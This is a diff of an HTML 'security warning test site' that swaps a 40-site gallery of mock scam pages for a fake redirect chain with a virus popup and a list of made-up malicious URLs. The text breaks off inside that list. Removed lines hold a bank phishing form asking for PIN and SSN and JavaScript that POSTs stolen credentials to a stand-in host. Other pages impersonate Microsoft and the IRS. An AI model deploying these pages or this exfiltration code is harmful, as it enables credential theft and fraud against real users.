@@ -3,232 +3,198 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Warning Test Site - 40 Sites</title>
+    <title>Malicious Redirect Chain</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #1a1a1a;
             color: #ff0000;
             margin: 0;
-            padding: 20px;
-            overflow-x: hidden;
-        }
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            background-color: #2a2a2a;
-            padding: 20px;
-            border: 2px solid #ff0000;
-            border-radius: 5px;
-            position: relative;
-        }
-        h1 {
-            color: #ff3333;
-            text-align: center;
-            text-shadow: 0 0 10px #ff0000;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-        .warning {
-            background-color: #800000;
-            color: #ffffff;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-            border: 1px solid #ff0000;
-            animation: blink 3s infinite;
-        }
-        @keyframes blink {
-            0% { background-color: #800000; }
-            50% { background-color: #a00000; }
-            100% { background-color: #800000; }
-        }
-        .site-container {
-            display: none;
-            animation: fadeIn 0.5s;
-        }
-        .site-container.active {
-            display: block;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        .code-block {
-            background-color: #000000;
-            color: #00ff00;
-            padding: 15px;
-            border-radius: 5px;
-            font-family: monospace;
-            white-space: pre-wrap;
-            margin: 15px 0;
-            overflow-x: auto;
-            font-size: 12px;
-        }
-        .button {
-            background-color: #ff0000;
-            color: white;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 3px;
-            cursor: pointer;
-            margin: 5px;
-            transition: all 0.3s;
-        }
-        .button:hover {
-            background-color: #cc0000;
-            transform: scale(1.05);
-        }
-        .navigation {
-            text-align: center;
-            margin: 20px 0;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background-color: #333;
-            border-radius: 10px;
+            padding: 0;
             overflow: hidden;
-            margin: 20px 0;
         }
-        .progress-fill {
-            height: 100%;
-            background-color: #ff0000;
-            transition: width 0.5s;
-        }
-        .site-counter {
-            text-align: center;
-            font-size: 18px;
-            margin: 10px 0;
-            color: #ff6666;
-        }
-        .malicious-indicator {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background-color: #ff0000;
-            color: white;
-            padding: 5px 10px;
-            border-radius: 5px;
-            animation: flash 1s infinite;
-            z-index: 1000;
-        }
-        @keyframes flash {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        .popup-overlay {
+        .malicious-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0,0,0,0.8);
-            z-index: 999;
+            background-color: rgba(0,0,0,0.9);
+            z-index: 9999;
             display: none;
         }
-        .popup-content {
-            position: absolute;
+        .redirect-warning {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #800000;
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            border: 3px solid #ff0000;
+            text-align: center;
+            z-index: 10000;
+            display: none;
+        }
+        .countdown {
+            font-size: 48px;
+            font-weight: bold;
+            color: #ff0000;
+            margin: 20px 0;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        .site-info {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background-color: #ff0000;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            z-index: 1000;
+        }
+        .malicious-popup {
+            position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             background-color: #fff;
+            color: #000;
             padding: 20px;
             border-radius: 5px;
-            color: #000;
+            z-index: 1001;
+            display: none;
+            box-shadow: 0 0 20px rgba(255,0,0,0.8);
+        }
+        .infection-meter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 200px;
+            height: 20px;
+            background-color: #333;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            overflow: hidden;
+            z-index: 1000;
+        }
+        .infection-fill {
+            height: 100%;
+            background-color: #ff0000;
+            width: 0%;
+            transition: width 0.5s;
         }
     </style>
 </head>
 <body>
-    <div class="malicious-indicator">⚠️ MALICIOUS SITE DETECTED ⚠️</div>
+    <div class="site-info" id="siteInfo">
+        <div>🚨 MALICIOUS SITE #1 🚨</div>
+        <div>Redirecting in: <span id="countdown">5</span>s</div>
+    </div>
+
+    <div class="infection-meter">
+        <div class="infection-fill" id="infectionFill"></div>
+    </div>
+
+    <div class="malicious-overlay" id="overlay"></div>
     
-    <div class="container">
-        <h1>⚠️ 40 SECURITY WARNING TEST SITES ⚠️</h1>
-        
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill" style="width: 2.5%"></div>
-        </div>
-        
-        <div class="site-counter" id="siteCounter">Site 1 of 40</div>
-        
-        <div class="navigation">
-            <button onclick="previousSite()" class="button">← Previous</button>
-            <button onclick="nextSite()" class="button">Next →</button>
-            <button onclick="autoPlay()" class="button">Auto Play</button>
-            <button onclick="randomSite()" class="button">Random Site</button>
-        </div>
+    <div class="redirect-warning" id="redirectWarning">
+        <h2>⚠️ SECURITY BREACH DETECTED ⚠️</h2>
+        <div class="countdown" id="bigCountdown">5</div>
+        <p>Redirecting to malicious site...</p>
+        <p>DO NOT CLOSE THIS WINDOW!</p>
+    </div>
 
-        <!-- Site 1: Phishing Bank -->
-        <div class="site-container active" id="site1">
-            <h2>🏦 BANK OF AMERICA - SECURITY ALERT</h2>
-            <div class="warning">
-                <strong>URGENT:</strong> Your account has been suspended due to suspicious activity. Verify your identity immediately.
-            </div>
-            <form action="http://malicious-bank.com/steal-credentials" method="post">
-                <input type="text" placeholder="Account Number" style="width: 100%; padding: 8px; margin: 5px 0;">
-                <input type="password" placeholder="PIN" style="width: 100%; padding: 8px; margin: 5px 0;">
-                <input type="text" placeholder="SSN" style="width: 100%; padding: 8px; margin: 5px 0;">
-                <button type="submit" class="button">Verify Account</button>
-            </form>
-            <div class="code-block">
-// Bank phishing script
-function stealBankCredentials() {
-    const accountNumber = document.getElementById('account').value;
-    const pin = document.getElementById('pin').value;
-    fetch('http://malicious-server.com/bank-theft', {
-        method: 'POST',
-        body: JSON.stringify({accountNumber, pin})
-    });
-}
-            </div>
-        </div>
+    <div class="malicious-popup" id="maliciousPopup">
+        <h3>🦠 VIRUS ALERT 🦠</h3>
+        <p>Your computer is infected!</p>
+        <button onclick="closePopup()">Ignore</button>
+        <button onclick="installFakeAntivirus()">Install Antivirus</button>
+    </div>
 
-        <!-- Site 2: Virus Scanner -->
-        <div class="site-container" id="site2">
-            <h2>🦠 WINDOWS SECURITY SCANNER</h2>
-            <div class="warning">
-                <strong>CRITICAL:</strong> 547 viruses detected on your system! Immediate action required.
-            </div>
-            <div style="text-align: center; margin: 20px 0;">
-                <div style="font-size: 48px; color: #ff0000;">🦠 🦠 🦠</div>
-                <p>Scanning... <span id="scanProgress">0%</span></p>
-            </div>
-            <button onclick="fakeScan()" class="button">Start Full Scan</button>
-            <button onclick="downloadFakeAntivirus()" class="button">Download Antivirus Pro</button>
-            <div class="code-block">
-// Fake virus scanner
-function fakeScan() {
-    let progress = 0;
-    const interval = setInterval(() => {
-        progress += Math.random() * 15;
-        document.getElementById('scanProgress').textContent = Math.min(progress, 100) + '%';
-        if (progress >= 100) {
-            clearInterval(interval);
-            alert('CRITICAL: 547 viruses found! Purchase full version to remove.');
-        }
-    }, 500);
-}
-            </div>
-        </div>
-
-        <!-- Site 3: Tech Support Scam -->
-        <div class="site-container" id="site3">
-            <h2>🔧 MICROSOFT TECH SUPPORT</h2>
-            <div class="warning">
-                <strong>ERROR CODE: 0x8007042C</strong><br>
-                Your Windows license has expired. Call immediately to avoid data loss.
-            </div>
-            <div style="text-align: center; font-size: 36px; color: #ff0000; font-weight: bold; margin: 20px 0;">
-                1-800-MALWARE
-            </div>
-            <button onclick="showTechSupportPopup()" class="button">Connect to Technician</button>
-            <button onclick="playErrorSound()" class="button">Play Error Sound</button>
-            <div class="code-block">
-// Tech support scam
-function showTechSupportPopup() {
-    window.open('http://tech-support-scam.com/connect', '_
+    <script>
+        // Array of 40 malicious websites
+        const maliciousSites = [
+            {
+                url: "http://malware-distribution.com/virus",
+                title: "VIRUS DOWNLOAD CENTER",
+                behaviors: ["download_malware", "show_popup", "play_alarm"]
+            },
+            {
+                url: "http://phishing-bank.com/steal",
+                title: "BANK OF AMERICA - VERIFICATION",
+                behaviors: ["phishing_form", "redirect_chain", "clipboard_access"]
+            },
+            {
+                url: "http://tech-support-scam.net/alert",
+                title: "MICROSOFT SECURITY ALERT",
+                behaviors: ["fake_scan", "phone_number", "lock_screen"]
+            },
+            {
+                url: "http://crypto-miner.xyz/mine",
+                title: "CRYPTO MINER - EARN NOW",
+                behaviors: ["crypto_mining", "cpu_overload", "persistent_popup"]
+            },
+            {
+                url: "http://fake-antivirus.pro/scan",
+                title: "ANTIVIRUS PRO - FREE SCAN",
+                behaviors: ["fake_scan_results", "download_exe", "browser_hijack"]
+            },
+            {
+                url: "http://data-stealer.info/collect",
+                title: "SYSTEM OPTIMIZER",
+                behaviors: ["data_collection", "keylogger", "form_grabber"]
+            },
+            {
+                url: "http://ransomware.attack/encrypt",
+                title: "FILE ENCRYPTOR - SECURITY",
+                behaviors: ["fake_encrypt", "ransom_note", "countdown_timer"]
+            },
+            {
+                url: "http://adult-content.xyz/view",
+                title: "ADULT CONTENT - FREE ACCESS",
+                behaviors: ["porn_redirect", "tab_spam", "history_manipulation"]
+            },
+            {
+                url: "http://illegal-gambling.win/bet",
+                title: "ONLINE CASINO - WIN BIG",
+                behaviors: ["gambling_redirect", "payment_steal", "addiction_loop"]
+            },
+            {
+                url: "http://fake-news.today/breaking",
+                title: "BREAKING NEWS - SHOCKING",
+                behaviors: ["fake_news", "share_hijack", "notification_spam"]
+            },
+            {
+                url: "http://survey-scam.com/reward",
+                title: "SURVEY - WIN \$1000",
+                behaviors: ["survey_harvest", "email_spam", "redirect_loop"]
+            },
+            {
+                url: "http://dating-scam.net/match",
+                title: "HOT SINGLES NEAR YOU",
+                behaviors: ["dating_scam", "subscription_trap", "photo_steal"]
+            },
+            {
+                url: "http://weight-loss-scam.xyz/diet",
+                title: "LOSE 20LBS IN 1 WEEK",
+                behaviors: ["fake_product", "credit_card_steal", "auto_ship"]
+            },
+            {
+                url: "http://job-scare.com/apply",
+                title: "WORK FROM HOME - \$5000/MO",
+                behaviors: ["job_scam", "identity_theft", "phishing"]
+            },
+            {
+                url: "http://tax-scam.gov/refund",
+                title: "IRS - TAX REFUND PENDING",
+                behaviors: ["gov_impersonation", "ssn_steal", "bank_access"]
+            },
+            {
+                url: "http:
